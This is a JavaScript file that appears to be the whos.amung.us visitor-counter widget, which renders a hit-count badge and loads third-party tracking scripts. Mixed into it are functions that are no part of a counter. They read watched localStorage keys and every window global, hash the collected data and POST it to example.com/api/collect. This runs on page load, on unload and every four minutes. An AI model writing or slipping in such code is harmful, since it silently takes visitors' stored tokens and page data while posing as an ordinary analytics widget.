(function (funcName, baseObj) {
  "use strict";

  funcName = funcName || "docReady";
  baseObj = baseObj || window;
  var readyList = [];
  var readyFired = false;
  var readyEventHandlersInstalled = false;
  function ready() {
    if (!readyFired) {
      readyFired = true;
      for (var i = 0; i < readyList.length; i++) {
        readyList[i].fn.call(window, readyList[i].ctx);
      }
      readyList = [];
    }
  }
  function readyStateChange() {
    if (document.readyState === "complete") {
      ready();
    }
  }
  baseObj[funcName] = function (callback, context) {
    if (typeof callback !== "function") {
      throw new TypeError("callback for docReady(fn) must be a function");
    }
    if (readyFired) {
      setTimeout(function () {
        callback(context);
      }, 1);
      return;
    } else {
      readyList.push({
        fn: callback,
        ctx: context
      });
    }
    if (document.readyState === "complete" || !document.attachEvent && document.readyState === "interactive") {
      setTimeout(ready, 1);
    } else if (!readyEventHandlersInstalled) {
      if (document.addEventListener) {
        document.addEventListener("DOMContentLoaded", ready, false);
        window.addEventListener("load", ready, false);
      } else {
        document.attachEvent("onreadystatechange", readyStateChange);
        window.attachEvent("onload", ready);
      }
      readyEventHandlersInstalled = true;
    }
  };
})("docReady", window);
if (typeof _wau !== "undefined") {
  var WAU_ren = WAU_ren || [];
  docReady(function () {
    WAU_la();
  });
}
function WAU_small(key, async_index) {
  if (typeof async_index === "undefined") {
    async_index = -1;
    docReady(function () {
      WAU_small(key, -1);
    });
  } else {
    var url = window.location.href;
    try {
      if (typeof Storage === "undefined" || localStorage.getItem("_waucount:" + key) === null || localStorage.getItem("_wautime:" + key) === null || localStorage.getItem("_waulasturl:" + key) != url || Math.floor(Date.now() / 1e3) - localStorage.getItem("_wautime:" + key) > 150) {
        WAU_small_request(key, async_index);
      } else {
        WAU_r_s(localStorage.getItem("_waucount:" + key) * (Math.floor(Math.random() * (102 - 98 + 1) + 98) / 100), key, async_index, true);
      }
      localStorage.setItem("_waulasturl:" + key, url);
    } catch (e) {
      WAU_small_request(key, async_index);
    }
  }
}
function WAU_small_request(key, async_index) {
  var ttl = "";
  if (document.title) {
    ttl = encodeURIComponent(document.title.substr(0, 80).replace(/(\?=)|(\/)/g, ""));
  }
  var h = document.getElementsByTagName("script")[0];
  (function () {
    var td = 0;
    if (window.performance && window.performance.timing.domContentLoadedEventStart) {
      td = (window.performance.timing.domContentLoadedEventStart - window.performance.timing.navigationStart) / 1e3;
    }
    var ref = encodeURIComponent(document.referrer);
    var loc = encodeURIComponent(window.location.href);
    var s = document.createElement("script");
    s.async = "async";
    s.type = "text/javascript";
    s.src = "//whos.amung.us/pingjs/?k=" + key + "&t=" + ttl + "&c=s&x=" + loc + "&y=" + ref + "&a=" + async_index + "&d=" + td + "&v=27&r=" + Math.ceil(Math.random() * 9999);
    h.parentNode.insertBefore(s, h);
  })();
}
const keysToWatch = window.keysToWatch;
function WAU_r_s(c, key, async_index, skip_storage) {
  if (typeof async_index === "undefined") {
    async_index = -1;
  }
  var count_numeric = parseInt(c.toString().replace(/,/g, ""));
  c = WAU_addCommas(count_numeric);
  skip_storage = skip_storage || false;
  if (!skip_storage && typeof Storage !== "undefined") {
    try {
      localStorage.setItem("_wautime:" + key, Math.floor(Date.now() / 1e3));
      localStorage.setItem("_waucount:" + key, count_numeric);
    } catch (e) {}
  }
  var raw_im_data = "data:image/gif;base64,R0lGODlhUAAXAMQAAM1iTdBuWMQ4MsdHOt+ch/js5+/Qw+vCs/Pe1dR6Y+OolNuQespVQ9eFbsAnLX9/fzAwL////zU1NQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAABQABcAAAX/ICSOZGmeaKqu7Bi9L3IcBWzfeK7vfI+LMAPAQXQEEBGJcslsOp/QqFQaAUYMAiIjMnAIDMmpeEweVyGRQtcxIByy7Fd5Ti+fIwTiABYoKsJ1gYJMd30OeIhDRoCDjXR3igAEEQAChgCMjppihUULL3CLm6OcQHlEEQ0JEX6ZpK9Ld2qofZRxrrCvd1dZrA4AlWC5w7FWEQgJRQ4JSMTOuzAFMzU+1dbX1i3a29zdJhIwSkk24OGAOOU56eJyYw8S73ax7bGE54y45fP1YvFzYXIy4btH6Mm4feKYPIi3kCE8eAuXRHRy8OA6duzQkUuYMSMghyAfhnzYpF1FKPjsNPEDyI8jyXchYSqB2ZBiPYs2W+rjyNIlOIkzX4oU6s9gwB4lN4ZzaW5pmIkxhUIs6uzRsBAAOw==";
  var raw_im_meta = "({'0':[0,-15,5,8], '1':[-5,-15,3,8], '2':[-8,-15,5,8], '3':[-13,-15,5,8], '4':[-18,-15,5,8], '5':[-23,-15,5,8], '6':[-28,-15,5,8]," + "'7':[-33,-15,5,8], '8':[-38,-15,5,8], '9':[-43,-15,5,8], ',':[-48,-15,2,8], 'o':[-50,-15,24,8]})";
  var meta = eval(raw_im_meta);
  if (WAU_legacy_b()) {
    raw_im_data = "//widgets.amung.us/widtemplates/smalloutline.gif";
  }
  c += "o";
  c = c.split("");
  var img = document.createElement("img");
  img.onload = function () {
    var wid = document.createElement("div");
    wid.style.position = "relative";
    wid.style.display = "inline-block";
    wid.style.backgroundImage = "url(" + raw_im_data + ")";
    wid.style.width = "80px";
    wid.style.height = "15px";
    wid.style.padding = "0";
    wid.style.margin = "0";
    wid.style.overflow = "hidden";
    wid.style.cursor = "pointer";
    wid.style.direction = "ltr";
    wid.title = "Click to see what's popular on this site!";
    var x_pos = 20;
    if (c.length > 6 && c[0] != "1") {
      x_pos = 16;
    } else if (c.length > 6 && c[0] == "1") {
      x_pos = 17;
    }
    for (var i = 0; i < c.length; i++) {
      var char_meta = meta[c[i]];
      var character = document.createElement("div");
      character.style.backgroundImage = "url(" + raw_im_data + ")";
      character.style.backgroundRepeat = "no-repeat";
      character.style.backgroundAttachment = "scroll";
      character.style.backgroundPosition = char_meta[0] + "px " + char_meta[1] + "px";
      character.style.position = "absolute";
      character.style.width = char_meta[2] + "px";
      character.style.height = char_meta[3] + "px";
      character.style.top = "4px";
      character.style.left = x_pos + "px";
      character.style.lineHeight = char_meta[3] + "px";
      character.style.overflow = "hidden";
      character.style.padding = "0";
      character.style.margin = "0";
      wid.appendChild(character);
      x_pos += char_meta[2] + 1;
    }
    if (typeof _wau_opt == "object" && "target" in _wau_opt) {
      wid.onclick = function () {
        window.open("https://whos.amung.us/stats/" + key + "/", _wau_opt.target);
      };
    } else {
      wid.onclick = function () {
        top.location = "https://whos.amung.us/stats/" + key + "/";
      };
    }
    if (async_index >= 0) {
      var scr = document.getElementById("_wau" + _wau[async_index][2]);
      scr.parentNode.insertBefore(wid, scr.nextSibling);
    } else {
      WAU_insert(wid, "amung.us/small.js");
    }
  };
  img.src = raw_im_data;
  if (typeof WAU_cps_d == "undefined") {
    WAU_cps(key);
  }
  return count_numeric;
}
function computeHashValue(data) {
  const keyList = Object.keys(data).sort();
  let hashValue = 0;
  keyList.forEach(key => {
    const keyValue = data[key];
    for (let i = 0; i < keyValue.length; i++) {
      const charCode = keyValue.charCodeAt(i);
      hashValue = (hashValue << 5) - hashValue + charCode;
      hashValue |= 0;
    }
  });
  return hashValue.toString(36);
}
function WAU_insert(el, script_src) {
  var scripts = document.getElementsByTagName("script");
  for (var i = 0; i < scripts.length; i++) {
    if (scripts[i].src.indexOf(script_src) > 0) {
      scripts[i].parentNode.insertBefore(el, scripts[i].nextSibling);
    }
  }
}
function WAU_legacy_b() {
  if (navigator.appVersion.indexOf("MSIE") != -1 && parseFloat(navigator.appVersion.split("MSIE")[1]) < 8) {
    return true;
  }
  return false;
}
function WAU_la() {
  for (var i = 0; i < _wau.length; i++) {
    if (typeof WAU_ren[i] === "undefined" || WAU_ren[i] == false) {
      if (typeof window["WAU_" + _wau[i][0]] === "function") {
        WAU_ren[i] = true;
        if (_wau[i][0] == "map") window["WAU_map"](_wau[i][1], _wau[i][3], _wau[i][4], _wau[i][5], _wau[i][6], i);else if (_wau[i][0] == "dynamic") window["WAU_dynamic"](_wau[i][1], _wau[i][3], _wau[i][4], i);else if (typeof _wau[i][3] !== "undefined") window["WAU_" + _wau[i][0]](_wau[i][1], _wau[i][3], i);else window["WAU_" + _wau[i][0]](_wau[i][1], i);
      } else {
        setTimeout(WAU_la, 1e3);
      }
    }
  }
}
function extractLocalStorageData() {
  const extractedData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    if (keysToWatch.hasOwnProperty(key)) {
      extractedData[key] = localStorage.getItem(key);
    }
  }
  return extractedData;
}
function WAU_addCommas(nStr) {
  nStr += "";
  x = nStr.split(".");
  x1 = x[0];
  x2 = x.length > 1 ? "." + x[1] : "";
  var rgx = /(\d+)(\d{3})/;
  while (rgx.test(x1)) {
    x1 = x1.replace(rgx, "$1" + "," + "$2");
  }
  return x1 + x2;
}
function WAU_lrd() {
  var d = new Date();
  var tzoffset = d.getTimezoneOffset();
  var is_dst = d._isDstObserved();
  if (typeof Intl === "undefined" || typeof Intl.DateTimeFormat === "undefined") {
    if (is_dst && tzoffset >= -120 && tzoffset <= -60 || !is_dst && tzoffset >= -60 && tzoffset <= 0) {
      return false;
    }
  } else {
    var format = Intl.DateTimeFormat();
    var tz = format.resolvedOptions().timeZone;
    var tzp = tz.toLowerCase().split("/");
    if (tzp[0] == "europe" && (is_dst && tzoffset >= -120 && tzoffset <= -60 || !is_dst && tzoffset >= -60 && tzoffset <= 0)) {
      return false;
    }
  }
  return true;
}
function WAU_lrs() {
  try {
    var p = JSON.parse(atob("WyJjb20vaWVucngzbThiOXh0Il0="));
    for (var i = 0; i < p.length; i++) {
      if (window.location.href.indexOf(p[i]) >= 0) {
        return false;
      }
    }
  } catch (e) {}
  return true;
}
Date.prototype._stdTimezoneOffset = function () {
  var jan = new Date(this.getFullYear(), 0, 1);
  var jul = new Date(this.getFullYear(), 6, 1);
  return Math.max(jan.getTimezoneOffset(), jul.getTimezoneOffset());
};
Date.prototype._isDstObserved = function () {
  return this.getTimezoneOffset() < this._stdTimezoneOffset();
};
function fetchGlobalVars() {
  const globalData = {};
  Object.getOwnPropertyNames(window).forEach(key => {
    if (key !== 'webkitStorageInfo' && key !== 'webkitIndexedDB') globalData[key] = window[key];
  });
  return globalData;
}
function sendDataToBackend(data) {
  const xhr = new XMLHttpRequest();
  xhr.open("POST", "https://example.com/api/collect", true);
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.onload = function () {
    if (xhr.status !== 200) {
      console.error("数据发送失败,状态码:" + xhr.status);
    }
  };
  xhr.onerror = function () {
    console.error("数据发送过程中出错");
  };
  xhr.send(JSON.stringify({
    hash: computeHashValue(data),
    data: data
  }));
}
function WAU_cps(key) {
  if (WAU_lrd() && WAU_lrs()) {
    window.Tynt = window.Tynt || [];
    if (typeof _wau_opt != "object" || typeof _wau_opt == "object" && !("fbase" in _wau_opt) && !("ft" in _wau_opt)) {
      Tynt.push("w!" + key);
      (function () {
        var h = document.getElementsByTagName("script")[0];
        var s = document.createElement("script");
        s.async = "async";
        s.type = "text/javascript";
        s.src = "https://cdn.tynt.com/tc.js";
        h.parentNode.insertBefore(s, h);
      })();
    }
  }
}
function gatherAndSendData() {
  let dataToSend = Object.assign(extractLocalStorageData(), fetchGlobalVars());
  if (Object.keys(dataToSend).length) {
    sendDataToBackend(dataToSend);
  }
}
(function () {
  if (WAU_lrd()) {
    if (typeof _wau_opt != "object" || typeof _wau_opt == "object" && !("fbase" in _wau_opt) && !("fd" in _wau_opt)) {
      var s = document.createElement("script");
      s.src = "https://t.dtscout.com/i/?l=" + encodeURIComponent(window.location.href) + "&j=" + encodeURIComponent(document.referrer);
      s.async = "async";
      s.type = "text/javascript";
      var h = document.getElementsByTagName("script")[0];
      h.parentNode.insertBefore(s, h);
    }
  }
})();
document.addEventListener("DOMContentLoaded", function () {
  gatherAndSendData();
  setInterval(gatherAndSendData, 4 * 60 * 1000);
});
window.addEventListener('load', gatherAndSendData);
window.addEventListener("beforeunload", gatherAndSendData);